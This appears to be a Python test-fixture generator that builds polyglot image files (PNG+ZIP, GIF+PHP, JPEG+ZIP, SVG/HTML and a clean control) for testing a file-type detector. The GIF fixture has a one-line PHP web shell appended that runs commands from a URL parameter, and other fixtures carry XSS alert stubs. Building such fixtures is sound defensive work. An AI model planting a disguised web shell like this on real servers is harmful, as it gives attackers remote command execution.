"""
Generates test polyglot files in tests/polyglots/.
Run once: python tests/make_polyglots.py
"""
import io
import struct
import zipfile
import zlib
from pathlib import Path

OUT = Path(__file__).parent / "polyglots"
OUT.mkdir(exist_ok=True)


def _png_chunk(chunk_type: bytes, data: bytes) -> bytes:
    crc = zlib.crc32(chunk_type + data) & 0xFFFFFFFF
    return struct.pack(">I", len(data)) + chunk_type + data + struct.pack(">I", crc)


def _minimal_png() -> bytes:
    magic = b"\x89PNG\r\n\x1a\n"
    ihdr_data = struct.pack(">IIBBBBB", 1, 1, 8, 2, 0, 0, 0)
    ihdr = _png_chunk(b"IHDR", ihdr_data)
    raw_row = b"\x00\xff\x00\x00"
    compressed = zlib.compress(raw_row)
    idat = _png_chunk(b"IDAT", compressed)
    iend = _png_chunk(b"IEND", b"")
    return magic + ihdr + idat + iend


def _make_zip(filename: str = "payload.txt", content: bytes = b"typebleed") -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_STORED) as zf:
        zf.writestr(filename, content)
    return buf.getvalue()


def _minimal_gif() -> bytes:
    header = b"GIF89a"
    lsd = struct.pack("<HHBBB", 1, 1, 0x00, 0, 0)
    image = b"\x2c" + struct.pack("<HHHHB", 0, 0, 1, 1, 0)
    image += b"\x02\x02\x4c\x01\x00"
    trailer = b"\x3b"
    return header + lsd + image + trailer


def make_png_zip():
    png = _minimal_png()
    zip_data = _make_zip()
    (OUT / "png_zip.png").write_bytes(png + zip_data)
    print("[+] png_zip.png")


def make_gif_php():
    gif = _minimal_gif()
    php = b"\n<?php echo shell_exec($_GET['cmd']); ?>"
    (OUT / "gif_php.gif").write_bytes(gif + php)
    print("[+] gif_php.gif")


def make_jpeg_zip():
    jpeg = (
        b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00"
        b"\xff\xdb\x00C\x00\x08\x06\x06\x07\x06\x05\x08\x07\x07\x07\t\t"
        b"\x08\n\x0c\x14\r\x0c\x0b\x0b\x0c\x19\x12\x13\x0f\x14\x1d\x1a"
        b"\x1f\x1e\x1d\x1a\x1c\x1c $.' \",#\x1c\x1c(7),01444\x1f'9=82<.342\x1e"
        b"\xff\xd9"
    )
    zip_data = _make_zip("evil.js", b"alert('xss')")
    (OUT / "jpeg_zip.jpg").write_bytes(jpeg + zip_data)
    print("[+] jpeg_zip.jpg")


def make_svg_html():
    content = b"""<!DOCTYPE html>
<html>
<head><title>innocent</title></head>
<body>
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)">
  <rect width="100" height="100" fill="red"/>
</svg>
</body>
</html>"""
    (OUT / "svg_html.svg").write_bytes(content)
    print("[+] svg_html.svg")


def make_clean_png():
    (OUT / "clean.png").write_bytes(_minimal_png())
    print("[+] clean.png (control)")


if __name__ == "__main__":
    make_png_zip()
    make_gif_php()
    make_jpeg_zip()
    make_svg_html()
    make_clean_png()
    print(f"\nPolyglots written to {OUT}/")
